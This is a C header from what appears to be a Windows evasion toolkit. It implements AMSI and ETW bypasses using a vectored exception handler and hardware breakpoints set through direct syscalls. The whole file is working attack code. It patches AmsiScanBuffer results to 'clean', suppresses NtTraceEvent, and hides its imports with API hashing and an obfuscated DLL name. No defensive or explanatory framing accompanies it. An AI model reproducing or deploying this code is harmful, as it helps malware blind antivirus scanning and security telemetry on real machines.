#ifndef GOD_MODE_STEALTH_H
#define GOD_MODE_STEALTH_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"
#include "syscalls.h"

extern PVOID     g_SyscallGadget;
extern API_TABLE g_ApiTable;

// Reemplazar IsBadPtr por NtQueryVirtualMemory para mayor sigilo y precisión
static BOOL SafeMemAccessCheck(PVOID addr, SIZE_T size) {
    MEMORY_BASIC_INFORMATION mbi = {0};
    NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtQueryVirtualMemory.ssn,
        g_SyscallGadget, (HANDLE)-1, addr, (ULONG)0, &mbi, sizeof(mbi), NULL);
    return (status == 0 && (mbi.State == MEM_COMMIT));
}

// =============================================================================
// VEH-BASED HWBP BYPASS (AMSI, ETW, etc.)
// =============================================================================

#define VEH_MAX_INVOCATIONS 100
#define MAX_HWBP 4

typedef struct _VEH_HWBP_STATE {
    PVOID  TargetAddress;
    DWORD  DrIndex;
    volatile LONG InvocationCount;
    BOOL   IsActive;
    BOOL   IsAMSI; // Flag for AMSI-specific stack patching
} VEH_HWBP_STATE;

typedef struct _VEH_GLOBAL_STATE {
    VEH_HWBP_STATE Breakpoints[MAX_HWBP];
    PVOID VehHandle;
} VEH_GLOBAL_STATE;

static VEH_GLOBAL_STATE g_VehState = {0};

// -----------------------------------------------------------------------------
// Find a RET gadget in ntdll as fallback for RIP redirection
// -----------------------------------------------------------------------------
static PVOID FindNtdllRetGadget() {
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    if (!hNtdll) return NULL;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            PBYTE base = (PBYTE)hNtdll + pSec[i].VirtualAddress;
            DWORD size = pSec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size; j++) {
                if (base[j] == 0xC3) return (PVOID)(base + j);
            }
        }
    }
    return NULL;
}

// -----------------------------------------------------------------------------
// VEH Callback – intercepts HWBP, re-arms, auto-removes
// -----------------------------------------------------------------------------
static LONG CALLBACK VEHCallback(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
    PEXCEPTION_RECORD pRec = ExceptionInfo->ExceptionRecord;
    PCONTEXT pCtx = ExceptionInfo->ContextRecord;

    if (pRec->ExceptionCode != EXCEPTION_SINGLE_STEP) return EXCEPTION_CONTINUE_SEARCH;

    VEH_HWBP_STATE *pBp = NULL;
    DWORD bpTriggered = (pCtx->Dr6 & 0x0F);

    for (int i = 0; i < MAX_HWBP; i++) {
        if (g_VehState.Breakpoints[i].IsActive && (bpTriggered & (1 << g_VehState.Breakpoints[i].DrIndex))) {
            if (pRec->ExceptionAddress == g_VehState.Breakpoints[i].TargetAddress) {
                pBp = &g_VehState.Breakpoints[i];
                break;
            }
        }
    }

    if (!pBp) return EXCEPTION_CONTINUE_SEARCH;

    // Increment invocation counter
    LONG count = InterlockedIncrement(&pBp->InvocationCount);

    // Apply bypass logic
    if (pBp->IsAMSI) {
        // Patch result: set AMSI_RESULT_CLEAN via stack
        PDWORD pResult = (PDWORD)(pCtx->Rsp + 0x30);
        if (pResult && SafeMemAccessCheck(pResult, sizeof(DWORD))) {
            *pResult = 0; // AMSI_RESULT_CLEAN
        }
    }

    // Set return value (E_INVALIDARG for AMSI, STATUS_SUCCESS for others)
    // Actually, for AmsiScanBuffer, S_OK (0) with result=CLEAN is better.
    // For NtTraceEvent, STATUS_SUCCESS (0) is perfect.
    pCtx->Rax = 0;

    // Redirect RIP to a RET instruction
    PBYTE pFunc = (PBYTE)pBp->TargetAddress;
    BOOL found = FALSE;
    if (pFunc && SafeMemAccessCheck(pFunc, 0x200)) {
        for (SIZE_T i = 0; i < 0x200; i++) {
            if (pFunc[i] == 0xC3) {
                pCtx->Rip = (DWORD64)(pFunc + i);
                found = TRUE;
                break;
            }
            if (pFunc[i] == 0xC2) { // RET imm16
                pCtx->Rip = (DWORD64)(pFunc + i);
                found = TRUE;
                break;
            }
        }
    }

    if (!found) {
        PVOID retGadget = FindNtdllRetGadget();
        if (retGadget) pCtx->Rip = (DWORD64)retGadget;
    }

    // Clear Dr6 status
    pCtx->Dr6 = 0;

    // Re-arm logic
    if (count >= VEH_MAX_INVOCATIONS) {
        pBp->IsActive = FALSE;
        // The actual DR clearing will happen in the next SetContext or during cleanup
    }

    return EXCEPTION_CONTINUE_EXECUTION;
}

// =============================================================================
// INSTALL HWBP VIA SYSCALLS (NtGet/SetThreadContext)
// =============================================================================

static BOOL InstallHWBP_Syscall(PVOID targetAddr, BOOL isAmsi) {
    if (!targetAddr) return FALSE;

    // Register VEH handler once
    if (!g_VehState.VehHandle) {
        g_VehState.VehHandle = AddVectoredExceptionHandler(1, VEHCallback);
    }
    if (!g_VehState.VehHandle) return FALSE;

    // Use syscalls for Get/SetThreadContext
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();

    NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtGetContextThread.ssn,
        g_SyscallGadget, hThread, &ctx);
    if (status != 0) return FALSE;

    // Find an empty debug register
    int slot = -1;
    for (int i = 0; i < MAX_HWBP; i++) {
        if (!g_VehState.Breakpoints[i].IsActive) {
            slot = i;
            break;
        }
    }
    if (slot == -1) return FALSE;

    // Find an empty DR register in the context
    int drIdx = -1;
    for (int i = 0; i < 4; i++) {
        if (!(ctx.Dr7 & (1 << (i * 2)))) {
            drIdx = i;
            break;
        }
    }
    if (drIdx == -1) return FALSE;

    // Configure the breakpoint
    VEH_HWBP_STATE *pBp = &g_VehState.Breakpoints[slot];
    pBp->TargetAddress = targetAddr;
    pBp->DrIndex = drIdx;
    pBp->InvocationCount = 0;
    pBp->IsActive = TRUE;
    pBp->IsAMSI = isAmsi;

    switch (drIdx) {
        case 0: ctx.Dr0 = (DWORD64)targetAddr; break;
        case 1: ctx.Dr1 = (DWORD64)targetAddr; break;
        case 2: ctx.Dr2 = (DWORD64)targetAddr; break;
        case 3: ctx.Dr3 = (DWORD64)targetAddr; break;
    }

    ctx.Dr7 |= (1 << (drIdx * 2));
    ctx.Dr7 &= ~(3 << (16 + drIdx * 4)); // Execution
    ctx.Dr7 &= ~(3 << (18 + drIdx * 4)); // 1 byte

    status = InvokeSyscall(g_ApiTable.syscalls.NtSetContextThread.ssn,
        g_SyscallGadget, hThread, &ctx);
    
    return (status == 0);
}

// =============================================================================
// CLEANUP
// =============================================================================

static void RemoveVEH() {
    if (g_VehState.VehHandle) {
        RemoveVectoredExceptionHandler(g_VehState.VehHandle);
        g_VehState.VehHandle = NULL;
    }

    for (int i = 0; i < MAX_HWBP; i++) g_VehState.Breakpoints[i].IsActive = FALSE;

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    InvokeSyscall(g_ApiTable.syscalls.NtGetContextThread.ssn, g_SyscallGadget, hThread, &ctx);
    ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
    ctx.Dr7 = 0x400;
    ctx.Dr6 = 0;
    InvokeSyscall(g_ApiTable.syscalls.NtSetContextThread.ssn, g_SyscallGadget, hThread, &ctx);
}


// =============================================================================
// PUBLIC: AMSI BYPASS VIA RE-ARMING VEH
// =============================================================================

static BOOL BypassAMSI_HWBP() {
    // Find amsi.dll
    PVOID hAmsi = NULL;
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    while (pEntry != pHead) {
        LDR_DATA_TABLE_ENTRY_PTR *pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY_PTR, InMemoryOrderLinks);
        if (pMod->BaseDllName.Buffer && pMod->BaseDllName.Buffer[0] == L'a') {
            hAmsi = pMod->DllBase;
            break;
        }
        pEntry = pEntry->Flink;
    }

    if (!hAmsi) {
        HMODULE hKernel32 = (HMODULE)GetModuleBaseByHash(HASH_KERNEL32);
        typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
        LoadLibraryW_t pLLW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
        hAmsi = pLLW(OBFUSCATE(L"amsi.dll"));
    }
    if (!hAmsi) return FALSE;

    // Resolve AmsiScanBuffer
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hAmsi;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hAmsi + pDos->e_lfanew);
    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hAmsi + expRVA);
    PDWORD pNames = (PDWORD)((PBYTE)hAmsi + pExp->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((PBYTE)hAmsi + pExp->AddressOfFunctions);
    PWORD  pOrds  = (PWORD)((PBYTE)hAmsi + pExp->AddressOfNameOrdinals);

    PVOID pAmsiScanBuffer = NULL;
    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char *n = (const char *)((PBYTE)hAmsi + pNames[i]);
        if (n[0] == 'A' && n[4] == 'S' && n[8] == 'B') {
            pAmsiScanBuffer = (PVOID)((PBYTE)hAmsi + pFuncs[pOrds[i]]);
            break;
        }
    }
    if (!pAmsiScanBuffer) return FALSE;

    return InstallHWBP_Syscall(pAmsiScanBuffer, TRUE);
}

// =============================================================================
// PUBLIC: ETW BYPASS VIA HWBP
// =============================================================================

static BOOL BypassETW_HWBP() {
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + expRVA);
    PDWORD pNames = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfFunctions);
    PWORD  pOrds  = (PWORD)((PBYTE)hNtdll + pExp->AddressOfNameOrdinals);

    PVOID pNtTraceEvent = NULL;
    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char *name = (const char *)((PBYTE)hNtdll + pNames[i]);
        if (name[0] == 'N' && name[1] == 't' && name[2] == 'T' &&
            name[3] == 'r' && name[4] == 'a' && name[5] == 'c' &&
            name[6] == 'e' && name[7] == 'E') {
            pNtTraceEvent = (PVOID)((PBYTE)hNtdll + pFuncs[pOrds[i]]);
            break;
        }
    }
    if (!pNtTraceEvent) return FALSE;

    return InstallHWBP_Syscall(pNtTraceEvent, FALSE);
}

#endif

